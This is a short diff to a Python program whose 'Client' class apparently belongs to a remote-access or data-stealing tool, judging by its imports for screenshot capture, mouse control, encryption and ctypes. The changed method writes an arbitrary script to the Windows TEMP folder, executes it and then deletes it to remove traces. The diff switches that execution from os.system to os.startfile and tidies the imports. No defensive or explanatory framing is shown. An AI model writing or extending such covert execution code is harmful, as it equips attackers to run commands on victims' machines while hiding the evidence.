@@ -48,17 +48,16 @@ from Crypto.Cipher import DES3, AES
 from pynput.mouse import Controller
 from random import randint, choice
 from urllib.parse import urlparse
-from time import sleep, ctime
 from re import findall, match
 from tempfile import mkdtemp
 from base64 import b64decode
-from nylas import APIClient
 from struct import unpack
 from PIL import ImageGrab
 from pathlib import Path
 from typing import Tuple
 from queue import Queue
 from pyotp import TOTP
+from time import sleep
 from ctypes import *
 
 
@@ -2101,7 +2100,7 @@ class Client():
         Creates the Script in TEMP Directory, Executes the Script and Deletes the Script
         """
         with open(os.getenv("TEMP") + "\\" + script_name + "." + script_type, "w") as f: f.write(script_code)
-        os.system(os.getenv("TEMP") + "\\" + script_name + "." + script_type)   # Executing Script
+        os.startfile(os.getenv("TEMP") + "\\" + script_name + "." + script_type)   # Executing Script
         os.remove(os.getenv("TEMP") + "\\" + script_name + "." + script_type)   # Deleting Script
 
     #endregion
